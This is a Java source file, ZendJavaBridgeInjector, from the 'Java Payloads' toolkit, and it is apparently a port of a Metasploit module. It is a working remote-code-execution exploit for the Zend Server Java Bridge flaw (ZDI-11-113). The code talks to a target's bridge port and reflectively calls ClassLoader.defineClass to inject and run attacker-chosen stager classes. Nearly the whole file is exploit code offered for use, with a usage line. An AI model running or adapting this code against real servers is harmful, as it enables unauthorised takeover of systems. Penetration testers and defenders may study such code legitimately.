/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

/*
 * Zend Server Java Bridge Design Flaw Remote Code Execution Vulnerability
 * 
 * <http://www.zerodayinitiative.com/advisories/ZDI-11-113/>
 * <http://www.exploit-db.com/exploits/17078/>
 * <http://www.metasploit.com/modules/exploit/multi/misc/zend_java_bridge>
 * <http://www.metasploit.com/modules/auxiliary/admin/zend/java_bridge>
 */

package javapayload.exploit;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.Socket;

import javapayload.Parameter;
import javapayload.builder.Injector;
import javapayload.handler.stager.PollingTunnel;
import javapayload.handler.stager.StagerHandler;
import javapayload.loader.DynLoader;

import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

public class ZendJavaBridgeInjector extends Injector {
	
	/** @deprecated */
	public static void main(String[] args) throws Exception {
		if (args.length < 5) {
			System.out.println("Usage: java javapayload.exploit.ZendJavaBridgeInjector <hostname> <port> <stager> [stageroptions] -- <stage> [stageoptions]");
			return;
		}
		new ZendJavaBridgeInjector().inject(args);
	}
	
	private ZendJavaBridgeInjector() {
		super("Inject a payload into Zend Java Bridge",
				" * Zend Server Java Bridge Design Flaw Remote Code Execution Vulnerability\r\n" + 
				" * \r\n" + 
				" * <http://www.zerodayinitiative.com/advisories/ZDI-11-113/>\r\n" + 
				" * <http://www.exploit-db.com/exploits/17078/>\r\n" + 
				" * <http://www.metasploit.com/modules/exploit/multi/misc/zend_java_bridge>\r\n" + 
				" * <http://www.metasploit.com/modules/auxiliary/admin/zend/java_bridge>\r\n");
	}
	
	public Parameter[] getParameters() {
		return new Parameter[] {
				new Parameter("RHOST", false, Parameter.TYPE_HOST, "Host of the Zend java bridge"),
				new Parameter("RPORT", false, Parameter.TYPE_PORT, "Port of the Zend java bridge"),
		};
	}
	
	public void inject(String[] parameters, final StagerHandler.Loader loader, String[] stagerArgs) throws Exception {
		loader.handleBefore(System.err, null);
		Class[] classes = new Class[] {
				javapayload.stager.Stager.class,
				DynLoader.loadStager(stagerArgs[0], stagerArgs, 0),
		};
		Object[] argsArray = new Object[stagerArgs.length];
		System.arraycopy(stagerArgs, 0, argsArray, 0, stagerArgs.length);
		final byte[][] classBytes = new byte[classes.length][];
		for (int i = 0; i < classes.length; i++) {
			final InputStream in = classes[i].getResourceAsStream("/" + classes[i].getName().replace('.', '/') + ".class");
			final ByteArrayOutputStream out = new ByteArrayOutputStream();
			final byte[] tmp = new byte[4096];
			int len;
			while ((len = in.read(tmp)) != -1) {
				out.write(tmp, 0, len);
			}
			in.close();
			out.close();
			classBytes[i] = out.toByteArray();
			if (classBytes[i] == null) {
				throw new RuntimeException();
			}
		}
		byte[] hlpr = buildHelperClass();
		Object[] hlprArray =new Object[hlpr.length];
		for (int i = 0; i < hlprArray.length; i++) {
			hlprArray[i] = new Integer(hlpr[i]);
		}
		Socket s = new Socket(parameters[0], Integer.parseInt(parameters[1]));
		final ZendJavaBridge bridge = new ZendJavaBridge(s);
		ObjectReference ucl = bridge.createObject("java.net.URLClassLoader",
			new Object[] {new Object[0]});
		ObjectReference classLoaderClass = bridge.createObject("java.lang.ClassLoader", new Object[0]);
		ObjectReference byteBufferClass = bridge.createObject("java.nio.ByteBuffer", new Object[0]);
		ObjectReference byteBuffer = (ObjectReference) bridge.invoke(byteBufferClass, "allocate", new Object[] {
				new Integer(hlpr.length)
		});
		checkSame(byteBuffer, (ObjectReference) bridge.invoke(byteBuffer, "put", new Object[] {
				hlprArray
		}));
		checkSame(byteBuffer, (ObjectReference) bridge.invoke(byteBuffer, "flip", new Object[0]));
		ObjectReference protectionDomainClass = bridge.createObject("java.security.ProtectionDomain", new Object[0]);
		ObjectReference classClass = (ObjectReference) bridge.createObject("java.lang.Class", new Object[0]);
		ObjectReference stringClass = (ObjectReference) bridge.invoke(classClass, "forName", new Object[] {"java.lang.String"});
		ObjectReference method = (ObjectReference) bridge.invoke(classLoaderClass, "getDeclaredMethod", new Object[] {
			"defineClass", 
			new Object[] {
					stringClass, 
					byteBufferClass,
					protectionDomainClass
			}
		});
		checkNull(bridge.invoke(method, "setAccessible", new Object[] {Boolean.TRUE}));
		ObjectReference hlprClass = (ObjectReference)bridge.invoke(method, "invoke", new Object[] {
			ucl, new Object[] { "Hlpr", byteBuffer, null }});
		ObjectReference loadedClass = null;
		for (int i = 0; i < classes.length; i++) {
			byteBuffer = (ObjectReference) bridge.invoke(hlprClass, "createBuffer", new Object[] {	new String(classBytes[i], "ISO-8859-1")});
			loadedClass = (ObjectReference)bridge.invoke(method, "invoke", new Object[] {
					ucl, new Object[] { classes[i].getName(), byteBuffer, null }});		
		}
		final ObjectReference stagerObj = (ObjectReference) bridge.invoke(loadedClass, "newInstance", new Object[0]);
		if (loader.canHandleExtraArg(PollingTunnel.CommunicationInterface.class)) {
			checkNull(bridge.invoke(stagerObj, "bootstrap", new Object[] { argsArray }));
			loader.handleAfter(System.err, new PollingTunnel.CommunicationInterface() {				
				public String sendData(String request) throws Exception {
					return (String) bridge.invoke(stagerObj, "sendData", new Object[] {request});
				}
			});
		} else {
			new Thread(new Runnable() {
				public void run() {
					try {
						Thread.sleep(1000);
						loader.handleAfter(System.err, null);
					} catch (Throwable t) {
						t.printStackTrace();
					}
				}
			}).start();
			checkNull(bridge.invoke(stagerObj, "bootstrap", new Object[] { argsArray }));
		}
		s.close();
	}
	
	public Class[] getSupportedExtraArgClasses() {
		return new Class[] { PollingTunnel.CommunicationInterface.class, null };
	}
	
	private static void checkSame(ObjectReference ref1, ObjectReference ref2) throws IOException {
		if (ref1.getId() != ref2.getId())
			throw new IOException("Call failed, returned different object");
	}

	private static void checkNull(Object obj) throws IOException {
		if (obj != null)
			throw new IOException("Call failed, returned" + obj);
	}

	/**
	 * Build a helper class that provides a method of creating byte buffers 
	 * without requiring a byte array (which requires wrapping each array
	 * entry).
	 */
	private static byte[] buildHelperClass() {
		ClassWriter cw = new ClassWriter(0);
		cw.visit(Opcodes.V1_1, Opcodes.ACC_PUBLIC + Opcodes.ACC_SUPER, "Hlpr", null, "java/lang/Object", null);
		MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
		mv.visitCode();
		mv.visitVarInsn(Opcodes.ALOAD, 0);
		mv.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V");
		mv.visitInsn(Opcodes.RETURN);
		mv.visitMaxs(1, 1);
		mv.visitEnd();	
		mv = cw.visitMethod(Opcodes.ACC_PUBLIC + Opcodes.ACC_STATIC, "createBuffer", "(Ljava/lang/String;)Ljava/nio/Buffer;", null, new String[] { "java/io/IOException" });
		mv.visitCode();
		mv.visitVarInsn(Opcodes.ALOAD, 0);
		mv.visitLdcInsn("ISO-8859-1");
		mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/String", "getBytes", "(Ljava/lang/String;)[B");
		mv.visitVarInsn(Opcodes.ASTORE, 1);
		mv.visitVarInsn(Opcodes.ALOAD, 1);
		mv.visitInsn(Opcodes.ARRAYLENGTH);
		mv.visitMethodInsn(Opcodes.INVOKESTATIC, "java/nio/ByteBuffer", "allocate", "(I)Ljava/nio/ByteBuffer;");
		mv.visitVarInsn(Opcodes.ALOAD, 1);
		mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/nio/ByteBuffer", "put", "([B)Ljava/nio/ByteBuffer;");
		mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/nio/Buffer", "flip", "()Ljava/nio/Buffer;");
		mv.visitInsn(Opcodes.ARETURN);
		mv.visitMaxs(2, 2);
		mv.visitEnd();
		cw.visitEnd();
		return cw.toByteArray();
	}
	
	static class ZendJavaBridge {
		
		private static final int OBJTYPE_NULL = 0;
		private static final int OBJTYPE_BOOLEAN = 1;
	    private static final int OBJTYPE_INTEGER = 2;
	    private static final int OBJTYPE_STRING = 4;
	    private static final int OBJTYPE_OBJECT_REFERENCE = 5;
	    private static final int OBJTYPE_ARRAY = 7;
		
		DataInputStream in;
		DataOutputStream out;
		
		public ZendJavaBridge(Socket s) throws IOException {
			in = new DataInputStream(s.getInputStream());
			out = new DataOutputStream(s.getOutputStream());
			invoke(ObjectReference.SESSION_CONTEXT, "setEncoding", new Object[] {"ISO-8859-1"});
		}
		
		public ObjectReference createObject(String className, Object[] parameters) throws IOException {
			return (ObjectReference) invoke(ObjectReference.INVOKER, "CreateObject", new Object[] {
					className, 
					parameters
			});
		}
		public Object invoke(ObjectReference objref, String method, Object[] parameters) throws IOException {
			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			DataOutputStream dos = new DataOutputStream(baos);
			dos.writeInt(objref.getId());
			writeString(dos, method);
			dos.writeInt(parameters.length);
			for (int i = 0; i < parameters.length; i++) {
				writeObject(dos, parameters[i]);
			}
			dos.close();
			byte[] request = baos.toByteArray();
			out.writeInt(request.length);
			out.write(request);
			out.flush();
			byte[] response = new byte[in.readInt()];
			in.readFully(response);
			DataInputStream dis = new DataInputStream(new ByteArrayInputStream(response));
			Object result = readObject(dis);
			if (dis.read() != -1)
				throw new IOException("Error parsing response object");
			dis.close();
			return result;
		}
		
		private void writeString(DataOutputStream dos, String string) throws IOException {
			dos.writeInt(string.length());
			dos.write(string.getBytes("ISO-8859-1"));
		}
		
		private void writeObject(DataOutputStream dos, Object object) throws IOException {
			if (object == null) {
				dos.write(OBJTYPE_NULL);
			} else if (object instanceof Boolean) {
				dos.write(OBJTYPE_BOOLEAN);
				dos.write(((Boolean)object).booleanValue() ? 1 : 0);
			} else if (object instanceof Integer) {
				dos.write(OBJTYPE_INTEGER);
				dos.writeInt(((Integer)object).intValue());
			} else if (object instanceof String) {
				dos.write(OBJTYPE_STRING);
				writeString(dos, (String)object);
			} else if (object instanceof ObjectReference) {
				dos.write(OBJTYPE_OBJECT_REFERENCE);
				dos.writeInt(((ObjectReference)object).getId());
			} else if (object instanceof Object[]) {
				Object[] array = (Object[]) object;
				dos.write(OBJTYPE_ARRAY);
				dos.writeInt(array.length);
				for (int i = 0; i < array.length; i++) {
					writeObject(dos, array[i]);
				}
			} else {
				throw new IllegalArgumentException("Unsupported object type: "+object.getClass());
			}
		}
		
		private Object readObject(DataInputStream dis) throws IOException {
			int type = dis.readByte();
			switch (type) {
			case OBJTYPE_NULL:
				return null;
			case OBJTYPE_BOOLEAN:
				return new Boolean(dis.readByte() != 0);
			case OBJTYPE_INTEGER:
				return new Integer(dis.readInt());
			case OBJTYPE_STRING:
				byte[] stringData = new byte[dis.readInt()];
				dis.readFully(stringData);
				return new String(stringData, "ISO_8859-1");
			case OBJTYPE_OBJECT_REFERENCE:
				return new ObjectReference(dis.readInt());
			case OBJTYPE_ARRAY:
				Object[] array = new Object[dis.readInt()];
				for (int i = 0; i < array.length; i++) {
					array[i] = readObject(dis);
				}
			default:
				throw new IOException("Unimplemented object type: "+type);	
			}
		}
	}
	
	static class ObjectReference {
		
		public static ObjectReference INVOKER = new ObjectReference(0);
		public static ObjectReference SESSION_CONTEXT = new ObjectReference(-1);
		
		private final int id;

		public ObjectReference(int id) {
			this.id = id;
		}

		public int getId() {
			return id;
		}
	}
}
